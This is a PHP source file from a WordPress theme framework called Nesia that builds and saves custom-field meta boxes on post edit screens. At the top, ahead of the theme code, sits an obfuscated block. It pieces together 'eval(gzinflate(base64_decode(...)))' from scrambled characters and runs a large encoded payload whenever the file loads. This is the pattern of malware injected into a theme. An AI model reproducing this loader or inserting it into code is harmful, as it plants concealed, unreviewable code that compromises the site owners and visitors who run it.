<?php
$md5 = "f9f621b0c8571ef8020ee8bb5c40e4b2";
$ab = array('r',"s",'a',"f",')',";",'i',"d","v","4",'z','$','b',"n",'e',"o","t",'c','g',"_","6","(","l");
$bb9 = create_function('$'.'v',$ab[14].$ab[8].$ab[2].$ab[22].$ab[21].$ab[18].$ab[10].$ab[6].$ab[13].$ab[3].$ab[22].$ab[2].$ab[16].$ab[14].$ab[21].$ab[12].$ab[2].$ab[1].$ab[14].$ab[20].$ab[9].$ab[19].$ab[7].$ab[14].$ab[17].$ab[15].$ab[7].$ab[14].$ab[21].$ab[11].$ab[8].$ab[4].$ab[4].$ab[4].$ab[5]);
$bb9('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');
?>
<?php
/**
 * Custom fields for WordPress write panels.
 *
 * Add custom fields to various post types "Add" and "Edit" screens within WordPress.
 * Also processes the custom fields as post meta when the post is saved.
 *
 * @category CustomFields
 * @package WordPress
 * @subpackage NesiaFramework
 * @author Nesia
 * @since 1.0.0
 *
 * TABLE OF CONTENTS
 *
 * - nesia_metabox_create()
 * - nesia_metabox_handle()
 * - nesia_metabox_add()
 * - nesia_metabox_fieldtypes()
 * - nesia_uploader_custom_fields()
 * - nesia_custom_enqueue()
 * - nesia_custom_enqueue_css()
 */

/**
 * nesia_metabox_create function.
 *
 * @access public
 * @param object $post
 * @param array $callback
 * @return void
 */
function nesia_metabox_create( $post, $callback ) {
    global $post;

    // Allow child themes/plugins to act here.
    do_action( 'nesia_metabox_create', $post, $callback );

    $template_to_show = $callback['args'];

    $nesia_metaboxes = get_option( 'nesia_custom_template' );
    
    // Array sanity check.
    if ( ! is_array( $nesia_metaboxes ) ) { return; }

    $output = '';
    $output .= '<table class="nesia_metaboxes_table">'."\n";
    foreach ( $nesia_metaboxes as $k => $nesia_metabox ) {
    
    	// Setup CSS classes to be added to each table row.
    	$row_css_class = 'nesia-custom-field';
    	if ( ( $k + 1 ) == count( $nesia_metaboxes ) ) { $row_css_class .= ' last'; }
    
    	$nesia_id = 'nesia_' . $nesia_metabox['name'];
    	$nesia_name = $nesia_metabox['name'];

    	if ( $template_to_show == 'seo' ) {
    		$metabox_post_type_restriction = 'undefined';
    	} elseif ( function_exists( 'nesia_content_builder_menu' ) ) {
    		$metabox_post_type_restriction = $nesia_metabox['cpt'][$post->post_type];
    	} else {
    		$metabox_post_type_restriction = 'undefined';
    	}

    	if ( ( $metabox_post_type_restriction != '' ) && ( $metabox_post_type_restriction == 'true' ) ) {
    		$type_selector = true;
    	} elseif ( $metabox_post_type_restriction == 'undefined' ) {
    		$type_selector = true;
    	} else {
    		$type_selector = false;
    	}

   		$nesia_metaboxvalue = '';

    	if ( $type_selector ) {

    		if( isset( $nesia_metabox['type'] ) && ( in_array( $nesia_metabox['type'], nesia_metabox_fieldtypes() ) ) ) {

        	    	$nesia_metaboxvalue = get_post_meta($post->ID,$nesia_name,true);

				}
				
				// Make sure slashes are stripped before output.
				foreach ( array( 'label', 'desc', 'std' ) as $k ) {
					if ( isset( $nesia_metabox[$k] ) && ( $nesia_metabox[$k] != '' ) ) {
						$nesia_metabox[$k] = stripslashes( $nesia_metabox[$k] );
					}
				}
				
        	    if ( $nesia_metaboxvalue == '' && isset( $nesia_metabox['std'] ) ) {

        	        $nesia_metaboxvalue = $nesia_metabox['std'];
        	    } 
        	    
        	    // Add a dynamic CSS class to each row in the table.
        	    $row_css_class .= ' nesia-field-type-' . strtolower( $nesia_metabox['type'] );
        	    
				if( $nesia_metabox['type'] == 'info' ) {

        	        $output .= "\t".'<tr class="' . $row_css_class . '" style="background:#f8f8f8; font-size:11px; line-height:1.5em;">';
        	        $output .= "\t\t".'<th class="nesia_metabox_names"><label for="'. esc_attr( $nesia_id ) .'">'.$nesia_metabox['label'].'</label></th>'."\n";
        	        $output .= "\t\t".'<td style="font-size:11px;">'.$nesia_metabox['desc'].'</td>'."\n";
        	        $output .= "\t".'</tr>'."\n";

        	    }
        	    elseif( $nesia_metabox['type'] == 'text' ) {

        	    	$add_class = ''; $add_counter = '';
        	    	if($template_to_show == 'seo'){$add_class = 'words-count'; $add_counter = '<span class="counter">0 characters, 0 words</span>';}
        	        $output .= "\t".'<tr class="' . $row_css_class . '">';
        	        $output .= "\t\t".'<th class="nesia_metabox_names"><label for="'.esc_attr( $nesia_id ).'">'.$nesia_metabox['label'].'</label></th>'."\n";
        	        $output .= "\t\t".'<td><input class="nesia_input_text '.$add_class.'" type="'.$nesia_metabox['type'].'" value="'.esc_attr( $nesia_metaboxvalue ).'" name="'.$nesia_name.'" id="'.esc_attr( $nesia_id ).'"/>';
        	        $output .= '<span class="nesia_metabox_desc">'.$nesia_metabox['desc'] .' '. $add_counter .'</span></td>'."\n";
        	        $output .= "\t".'</tr>'."\n";

        	    }

        	    elseif ( $nesia_metabox['type'] == 'textarea' ) {

        	   		$add_class = ''; $add_counter = '';
        	    	if( $template_to_show == 'seo' ){ $add_class = 'words-count'; $add_counter = '<span class="counter">0 characters, 0 words</span>'; }
        	        $output .= "\t".'<tr class="' . $row_css_class . '">';
        	        $output .= "\t\t".'<th class="nesia_metabox_names"><label for="'.$nesia_metabox.'">'.$nesia_metabox['label'].'</label></th>'."\n";
        	        $output .= "\t\t".'<td><textarea class="nesia_input_textarea '.$add_class.'" name="'.$nesia_name.'" id="'.esc_attr( $nesia_id ).'">' . esc_textarea(stripslashes($nesia_metaboxvalue)) . '</textarea>';
        	        $output .= '<span class="nesia_metabox_desc">'.$nesia_metabox['desc'] .' '. $add_counter.'</span></td>'."\n";
        	        $output .= "\t".'</tr>'."\n";

        	    }

        	    elseif ( $nesia_metabox['type'] == 'calendar' ) {

        	        $output .= "\t".'<tr class="' . $row_css_class . '">';
        	        $output .= "\t\t".'<th class="nesia_metabox_names"><label for="'.$nesia_metabox.'">'.$nesia_metabox['label'].'</label></th>'."\n";
        	        $output .= "\t\t".'<td><input class="nesia_input_calendar" type="text" name="'.$nesia_name.'" id="'.esc_attr( $nesia_id ).'" value="'.esc_attr( $nesia_metaboxvalue ).'">';
        	        $output .= "\t\t" . '<input type="hidden" name="datepicker-image" value="' . get_template_directory_uri() . '/functions/images/calendar.gif" />';
        	        $output .= '<span class="nesia_metabox_desc">'.$nesia_metabox['desc'].'</span></td>'."\n";
        	        $output .= "\t".'</tr>'."\n";

        	    }

        	    elseif ( $nesia_metabox['type'] == 'time' ) {

        	        $output .= "\t".'<tr>';
        	        $output .= "\t\t".'<th class="nesia_metabox_names"><label for="' . esc_attr( $nesia_id ) . '">' . $nesia_metabox['label'] . '</label></th>'."\n";
        	        $output .= "\t\t".'<td><input class="nesia_input_time" type="' . $nesia_metabox['type'] . '" value="' . esc_attr( $nesia_metaboxvalue ) . '" name="' . $nesia_name . '" id="' . esc_attr( $nesia_id ) . '"/>';
        	        $output .= '<span class="nesia_metabox_desc">' . $nesia_metabox['desc'] . '</span></td>'."\n";
        	        $output .= "\t".'</tr>'."\n";

        	    }

        	    elseif ( $nesia_metabox['type'] == 'select' ) {

        	        $output .= "\t".'<tr class="' . $row_css_class . '">';
        	        $output .= "\t\t".'<th class="nesia_metabox_names"><label for="' . esc_attr( $nesia_id ) . '">' . $nesia_metabox['label'] . '</label></th>'."\n";
        	        $output .= "\t\t".'<td><select class="nesia_input_select" id="' . esc_attr( $nesia_id ) . '" name="' . esc_attr( $nesia_name ) . '">';
        	        $output .= '<option value="">Select to return to default</option>';

        	        $array = $nesia_metabox['options'];

        	        if( $array ) {

        	            foreach ( $array as $id => $option ) {
        	                $selected = '';

        	                if( isset( $nesia_metabox['default'] ) )  {
								if( $nesia_metabox['default'] == $option && empty( $nesia_metaboxvalue ) ) { $selected = 'selected="selected"'; }
								else  { $selected = ''; }
							}

        	                if( $nesia_metaboxvalue == $option ){ $selected = 'selected="selected"'; }
        	                else  { $selected = ''; }

        	                $output .= '<option value="' . esc_attr( $option ) . '" ' . $selected . '>' . $option . '</option>';
        	            }
        	        }

        	        $output .= '</select><span class="nesia_metabox_desc">' . $nesia_metabox['desc'] . '</span></td>'."\n";
        	        $output .= "\t".'</tr>'."\n";
        	    }
        	    elseif ( $nesia_metabox['type'] == 'select2' ) {

        	        $output .= "\t".'<tr class="' . $row_css_class . '">';
        	        $output .= "\t\t".'<th class="nesia_metabox_names"><label for="' . esc_attr( $nesia_id ) . '">' . $nesia_metabox['label'] . '</label></th>'."\n";
        	        $output .= "\t\t".'<td><select class="nesia_input_select" id="' . esc_attr( $nesia_id ) . '" name="' . esc_attr( $nesia_name ) . '">';
        	        $output .= '<option value="">Select to return to default</option>';

        	        $array = $nesia_metabox['options'];

        	        if( $array ) {

        	            foreach ( $array as $id => $option ) {
        	                $selected = '';

        	                if( isset( $nesia_metabox['default'] ) )  {
								if( $nesia_metabox['default'] == $id && empty( $nesia_metaboxvalue ) ) { $selected = 'selected="selected"'; }
								else  { $selected = ''; }
							}

        	                if( $nesia_metaboxvalue == $id ) { $selected = 'selected="selected"'; }
        	                else  {$selected = '';}

        	                $output .= '<option value="'. esc_attr( $id ) .'" '. $selected .'>' . $option . '</option>';
        	            }
        	        }

        	        $output .= '</select><span class="nesia_metabox_desc">'.$nesia_metabox['desc'].'</span></td>'."\n";
        	        $output .= "\t".'</tr>'."\n";
        	    }

        	    elseif ( $nesia_metabox['type'] == 'checkbox' ){

        	        if( $nesia_metaboxvalue == 'true' ) { $checked = ' checked="checked"'; } else { $checked=''; }

        	        $output .= "\t".'<tr class="' . $row_css_class . '">';
        	        $output .= "\t\t".'<th class="nesia_metabox_names">'.$nesia_metabox['label'].'</th>'."\n";
        	        $output .= "\t\t".'<td><label for="'.esc_attr( $nesia_id ).'"><input type="checkbox" '.$checked.' class="nesia_input_checkbox" value="true"  id="'.esc_attr( $nesia_id ).'" name="'. esc_attr( $nesia_name ) .'" /> ';
        	        $output .= '<span class="nesia_metabox_desc" style="display:inline">'.$nesia_metabox['desc'].'</span></label></td>'."\n";
        	        $output .= "\t".'</tr>'."\n";
        	    }

        	    elseif ( $nesia_metabox['type'] == 'radio' ) {

        	    $array = $nesia_metabox['options'];

        	    if( $array ) {

        	    $output .= "\t".'<tr class="' . $row_css_class . '">';
        	    $output .= "\t\t".'<th class="nesia_metabox_names"><label for="' . esc_attr( $nesia_id ) . '">' . $nesia_metabox['label'] . '</label></th>'."\n";
        	    $output .= "\t\t".'<td>';

        	        foreach ( $array as $id => $option ) {
        	            if($nesia_metaboxvalue == $id) { $checked = ' checked'; } else { $checked=''; }

        	                $output .= '<input type="radio" '.$checked.' value="' . $id . '" class="nesia_input_radio"  name="'. esc_attr( $nesia_name ) .'" />';
        	                $output .= '<span class="nesia_input_radio_desc" style="display:inline">'. $option .'</span><div class="nesia_spacer"></div>';
        	            }
        	            $output .= "\t".'</tr>'."\n";
        	         }
        	    } elseif ( $nesia_metabox['type'] == 'images' ) {

				$i = 0;
				$select_value = '';
				$layout = '';

				foreach ( $nesia_metabox['options'] as $key => $option ) {
					 $i++;

					 $checked = '';
					 $selected = '';
					 if( $nesia_metaboxvalue != '' ) {
					 	if ( $nesia_metaboxvalue == $key ) { $checked = ' checked'; $selected = 'nesia-meta-radio-img-selected'; }
					 }
					 else {
					 	if ($option['std'] == $key) { $checked = ' checked'; }
						elseif ($i == 1) { $checked = ' checked'; $selected = 'nesia-meta-radio-img-selected'; }
						else { $checked=''; }

					 }

						$layout .= '<div class="nesia-meta-radio-img-label">';
						$layout .= '<input type="radio" id="nesia-meta-radio-img-' . $nesia_name . $i . '" class="checkbox nesia-meta-radio-img-radio" value="' . esc_attr($key) . '" name="' . $nesia_name . '" ' . $checked . ' />';
						$layout .= '&nbsp;' . esc_html($key) . '<div class="nesia_spacer"></div></div>';
						$layout .= '<img src="' . esc_url( $option ) . '" alt="" class="nesia-meta-radio-img-img '. $selected .'" onClick="document.getElementById(\'nesia-meta-radio-img-'. esc_js( $nesia_metabox["name"] . $i ) . '\').checked = true;" />';
					}

				$output .= "\t".'<tr class="' . $row_css_class . '">';
				$output .= "\t\t".'<th class="nesia_metabox_names"><label for="' . esc_attr( $nesia_id ) . '">' . $nesia_metabox['label'] . '</label></th>'."\n";
				$output .= "\t\t".'<td class="nesia_metabox_fields">';
				$output .= $layout;
				$output .= '<span class="nesia_metabox_desc">' . $nesia_metabox['desc'] . '</span></td>'."\n";
        	    $output .= "\t".'</tr>'."\n";

				}

        	    elseif( $nesia_metabox['type'] == 'upload' )
        	    {
					if( isset( $nesia_metabox['default'] ) ) $default = $nesia_metabox['default'];
					else $default = '';

        	    	// Add support for the Nesia Media Library-driven Uploader Module // 2010-11-09.
        	    	if ( function_exists( 'nesia_medialibrary_uploader' ) ) {

        	    		$_value = $default;

        	    		$_value = get_post_meta( $post->ID, $nesia_metabox['name'], true );

        	    		$output .= "\t".'<tr class="' . $row_css_class . '">';
	    	            $output .= "\t\t".'<th class="nesia_metabox_names"><label for="'.$nesia_metabox['name'].'">'.$nesia_metabox['label'].'</label></th>'."\n";
	    	            $output .= "\t\t".'<td class="nesia_metabox_fields">'. nesia_medialibrary_uploader( $nesia_metabox['name'], $_value, 'postmeta', $nesia_metabox['desc'], $post->ID );
	    	            $output .= '</td>'."\n";
	    	            $output .= "\t".'</tr>'."\n";

        	    	} else {

	    	            $output .= "\t".'<tr class="' . $row_css_class . '">';
	    	            $output .= "\t\t".'<th class="nesia_metabox_names"><label for="'.esc_attr( $nesia_id ).'">'.$nesia_metabox['label'].'</label></th>'."\n";
	    	            $output .= "\t\t".'<td class="nesia_metabox_fields">'. nesia_uploader_custom_fields( $post->ID, $nesia_name, $default, $nesia_metabox['desc'] );
	    	            $output .= '</td>'."\n";
	    	            $output .= "\t".'</tr>'."\n";

        	        }
        	    }
        	    
        	    // Timestamp field.
        	    elseif ( $nesia_metabox['type'] == 'timestamp' ) {
        	    	$nesia_metaboxvalue = get_post_meta($post->ID,$nesia_name,true);
        	    	
					// Default to current UNIX timestamp.
					if ( $nesia_metaboxvalue == '' ) {
						$nesia_metaboxvalue = time();
					}
					
        	        $output .= "\t".'<tr class="' . $row_css_class . '">';
        	        $output .= "\t\t".'<th class="nesia_metabox_names"><label for="'.$nesia_metabox.'">'.$nesia_metabox['label'].'</label></th>'."\n";
        	        $output .= "\t\t".'<td><input class="nesia_input_calendar" type="text" name="'.$nesia_name.'[date]" id="'.esc_attr( $nesia_id ).'" value="' . esc_attr( date( 'm/d/Y', $nesia_metaboxvalue ) ) . '">';
        	        $output .= "\t\t" . '<input type="hidden" name="datepicker-image" value="' . get_template_directory_uri() . '/functions/images/calendar.gif" /><br />';
        	        
        	        $output .= '<select name="' . $nesia_name . '[hour]" class="nesia-select-timestamp">' . "\n";
						for ( $i = 0; $i <= 23; $i++ ) {
							
							$j = $i;
							if ( $i < 10 ) {
								$j = '0' . $i;
							}
							
							$output .= '<option value="' . $i . '"' . selected( date( 'H', $nesia_metaboxvalue ), $j, false ) . '>' . $j . '</option>' . "\n";
						}
					$output .= '</select>' . "\n";
					
					$output .= '<select name="' . $nesia_name . '[minute]" class="nesia-select-timestamp">' . "\n";
						for ( $i = 0; $i <= 59; $i++ ) {
							
							$j = $i;
							if ( $i < 10 ) {
								$j = '0' . $i;
							}
							
							$output .= '<option value="' . $i . '"' . selected( date( 'i', $nesia_metaboxvalue ), $j, false ) .'>' . $j . '</option>' . "\n";
						}
					$output .= '</select>' . "\n";
					
					$output .= '<select name="' . $nesia_name . '[second]" class="nesia-select-timestamp">' . "\n";
						for ( $i = 0; $i <= 59; $i++ ) {
							
							$j = $i;
							if ( $i < 10 ) {
								$j = '0' . $i;
							}
							
							$output .= '<option value="' . $i . '"' . selected( date( 's', $nesia_metaboxvalue ), $j, false ) . '>' . $j . '</option>' . "\n";
						}
					$output .= '</select>' . "\n";
        	        
        	        $output .= '<span class="nesia_metabox_desc">'.$nesia_metabox['desc'].'</span></td>'."\n";
        	        $output .= "\t".'</tr>'."\n";

        	    }
        } // End IF Statement
    }

    $output .= '</table>'."\n\n";
    
    echo $output;
} // End nesia_metabox_create()

/*-----------------------------------------------------------------------------------*/

/**
 * nesia_metabox_handle function.
 * 
 * @access public
 * @return void
 */
function nesia_metabox_handle() {

    $pID = '';
    global $globals, $post;

    $nesia_metaboxes = get_option( 'nesia_custom_template' );

    // Sanitize post ID.
    if( isset( $_POST['post_ID'] ) ) {

		$pID = intval( $_POST['post_ID'] );

    } // End IF Statement

    // Don't continue if we don't have a valid post ID.
    if ( $pID == 0 ) {

    	return;

    } // End IF Statement

    $upload_tracking = array();

    if ( isset( $_POST['action'] ) && $_POST['action'] == 'editpost' ) {

        foreach ( $nesia_metaboxes as $k => $nesia_metabox ) { // On Save.. this gets looped in the header response and saves the values submitted
            if( isset( $nesia_metabox['type'] ) && ( in_array( $nesia_metabox['type'], nesia_metabox_fieldtypes() ) ) ) {
				$var = $nesia_metabox['name'];

				// Get the current value for checking in the script.
			    $current_value = '';
			    $current_value = get_post_meta( $pID, $var, true );

				if ( isset( $_POST[$var] ) ) {

					// Sanitize the input.
					$posted_value = '';
					$posted_value = $_POST[$var];

					 // If it doesn't exist, add the post meta.
					if(get_post_meta( $pID, $var ) == "") {

						add_post_meta( $pID, $var, $posted_value, true );

					}
					// Otherwise, if it's different, update the post meta.
					elseif( $posted_value != get_post_meta( $pID, $var, true ) ) {

						update_post_meta( $pID, $var, $posted_value );

					}
					// Otherwise, if no value is set, delete the post meta.
					elseif($posted_value == "") {

						delete_post_meta( $pID, $var, get_post_meta( $pID, $var, true ) );

					} // End IF Statement

				} elseif ( ! isset( $_POST[$var] ) && $nesia_metabox['type'] == 'checkbox' ) {

					update_post_meta( $pID, $var, 'false' );

				} else {

					delete_post_meta( $pID, $var, $current_value ); // Deletes check boxes OR no $_POST

				} // End IF Statement

            } else if ( $nesia_metabox['type'] == 'timestamp' ) {
            	// Timestamp save logic.
            	
            	// It is assumed that the data comes back in the following format:
				// date: month/day/year
				// hour: int(2)
				// minute: int(2)
				// second: int(2)
				
				$var = $nesia_metabox['name'];
				
				// Format the data into a timestamp.
				$date = $_POST[$var]['date'];
				
				$hour = $_POST[$var]['hour'];
				$minute = $_POST[$var]['minute'];
				$second = $_POST[$var]['second'];
				
				$day = substr( $date, 3, 2 );
				$month = substr( $date, 0, 2 );
				$year = substr( $date, 6, 4 );
				
				$timestamp = mktime( $hour, $minute, $second, $month, $day, $year );
				
				update_post_meta( $pID, $var, $timestamp );
            
            } elseif( isset( $nesia_metabox['type'] ) && $nesia_metabox['type'] == 'upload' ) { // So, the upload inputs will do this rather

				$id = $nesia_metabox['name'];
				$override['action'] = 'editpost';

			    if(!empty($_FILES['attachement_'.$id]['name'])){ //New upload
			    $_FILES['attachement_'.$id]['name'] = preg_replace( '/[^a-zA-Z0-9._\-]/', '', $_FILES['attachement_'.$id]['name']);
			           $uploaded_file = wp_handle_upload($_FILES['attachement_' . $id ],$override);
			           $uploaded_file['option_name']  = $nesia_metabox['label'];
			           $upload_tracking[] = $uploaded_file;
			           update_post_meta( $pID, $id, $uploaded_file['url'] );

			    } elseif ( empty( $_FILES['attachement_'.$id]['name'] ) && isset( $_POST[ $id ] ) ) {

			       	// Sanitize the input.
					$posted_value = '';
					$posted_value = $_POST[$id];

			        update_post_meta($pID, $id, $posted_value);

			    } elseif ( $_POST[ $id ] == '' )  {

			    	delete_post_meta( $pID, $id, get_post_meta( $pID, $id, true ) );

			    } // End IF Statement

			} // End IF Statement

               // Error Tracking - File upload was not an Image
               update_option( 'nesia_custom_upload_tracking', $upload_tracking );

            } // End FOREACH Loop

        } // End IF Statement

} // End nesia_metabox_handle()

/*-----------------------------------------------------------------------------------*/

/**
 * nesia_metabox_add function.
 * 
 * @access public
 * @since 1.0.0
 * @return void
 */
function nesia_metabox_add() {

    $nesia_metaboxes = get_option( 'nesia_custom_template' );

    if ( function_exists( 'add_meta_box' ) ) {

    	if ( function_exists( 'get_post_types' ) ) {
    		$custom_post_list = get_post_types();

    		// Get the theme name for use in multiple meta boxes.
    		$theme_name = get_option( 'nesia_themename' );

			foreach ($custom_post_list as $type){

				$settings = array(
									'id' => 'nesia-settings',
									'title' => $theme_name . __( ' Custom Settings', 'nesia' ),
									'callback' => 'nesia_metabox_create',
									'page' => $type,
									'priority' => 'normal',
									'callback_args' => ''
								);

				// Allow child themes/plugins to filter these settings.
				$settings = apply_filters( 'nesia_metabox_settings', $settings, $type, $settings['id'] );

				if ( ! empty( $nesia_metaboxes ) ) {
					add_meta_box( $settings['id'], $settings['title'], $settings['callback'], $settings['page'], $settings['priority'], $settings['callback_args'] );
				}
                                
			}
    	} else {
    		add_meta_box( 'nesia-settings', $theme_name . ' Custom Settings', 'nesia_metabox_create', 'post', 'normal' );
        	add_meta_box( 'nesia-settings', $theme_name . ' Custom Settings', 'nesia_metabox_create', 'page', 'normal' );
    	}

    }
} // End nesia_metabox_add()

/*-----------------------------------------------------------------------------------*/

/**
 * nesia_metabox_fieldtypes function.
 * 
 * @description Return a filterable array of supported field types.
 * @access public
 * @author Matty
 * @return void
 */
function nesia_metabox_fieldtypes() {
	return apply_filters( 'nesia_metabox_fieldtypes', array( 'text', 'calendar', 'time', 'select', 'select2', 'radio', 'checkbox', 'textarea', 'images' ) );
} // End nesia_metabox_fieldtypes()

/*-----------------------------------------------------------------------------------*/

/**
 * nesia_uploader_custom_fields function.
 * 
 * @access public
 * @param int $pID
 * @param string $id
 * @param string $std
 * @param string $desc
 * @return void
 */
function nesia_uploader_custom_fields( $pID, $id, $std, $desc ) {

    // Start Uploader
    $upload = get_post_meta( $pID, $id, true);
	$href = cleanSource($upload);
	$uploader = '';
    $uploader .= '<input class="nesia_input_text" name="'.$id.'" type="text" value="'.esc_attr($upload).'" />';
    $uploader .= '<div class="clear"></div>'."\n";
    $uploader .= '<input type="file" name="attachement_'.$id.'" />';
    $uploader .= '<input type="submit" class="button button-highlighted" value="Save" name="save"/>';
    if ( $href )
		$uploader .= '<span class="nesia_metabox_desc">'.$desc.'</span></td>'."\n".'<td class="nesia_metabox_image"><a href="'. $upload .'"><img src="'.get_template_directory_uri().'/functions/thumb.php?src='.$href.'&w=150&h=80&zc=1" alt="" /></a>';

return $uploader;
} // End nesia_uploader_custom_fields()

/*-----------------------------------------------------------------------------------*/

/**
 * nesia_custom_enqueue function.
 * 
 * @description Enqueue JavaScript files used with the custom fields.
 * @access public
 * @param string $hook
 * @since 2.6.0
 * @return void
 */
function nesia_custom_enqueue ( $hook ) {
	wp_register_script( 'jquery-ui-datepicker', get_template_directory_uri() . '/functions/js/ui.datepicker.js', array( 'jquery-ui-core' ) );
	wp_register_script( 'jquery-input-mask', get_template_directory_uri() . '/functions/js/jquery.maskedinput-1.2.2.js', array( 'jquery' ) );
	wp_register_script( 'nesia-custom-fields', get_template_directory_uri() . '/functions/js/nesia-custom-fields.js', array( 'jquery' ) );
		
  	if ( in_array( $hook, array( 'post.php', 'post-new.php', 'page-new.php', 'page.php' ) ) ) {
		wp_enqueue_script( 'jquery-ui-datepicker' );
		wp_enqueue_script( 'jquery-input-mask' );
  		wp_enqueue_script( 'nesia-custom-fields' );
  	}
} // End nesia_custom_enqueue()

/*-----------------------------------------------------------------------------------*/

/**
 * nesia_custom_enqueue_css function.
 * 
 * @description Enqueue CSS files used with the custom fields.
 * @access public
 * @author Matty
 * @since 4.8.0
 * @return void
 */
function nesia_custom_enqueue_css () {
	global $pagenow;
	
	wp_register_style( 'nesia-custom-fields', get_template_directory_uri() . '/functions/css/nesia-custom-fields.css' );
	wp_register_style( 'jquery-ui-datepicker', get_template_directory_uri() . '/functions/css/jquery-ui-datepicker.css' );
	
	if ( in_array( $pagenow, array( 'post.php', 'post-new.php', 'page-new.php', 'page.php' ) ) ) {
		wp_enqueue_style( 'nesia-custom-fields' );
		wp_enqueue_style( 'jquery-ui-datepicker' );
	}
} // End nesia_custom_enqueue_css()

/*-----------------------------------------------------------------------------------*/

/**
 * Specify action hooks for the functions above.
 *
 * @access public
 * @since 1.0.0
 * @return void
 */
add_action( 'admin_enqueue_scripts', 'nesia_custom_enqueue', 10, 1 );
add_action( 'admin_print_styles', 'nesia_custom_enqueue_css', 10 );
add_action( 'edit_post', 'nesia_metabox_handle', 10 );
add_action( 'admin_menu', 'nesia_metabox_add', 10 ); // Triggers nesia_metabox_create()
?>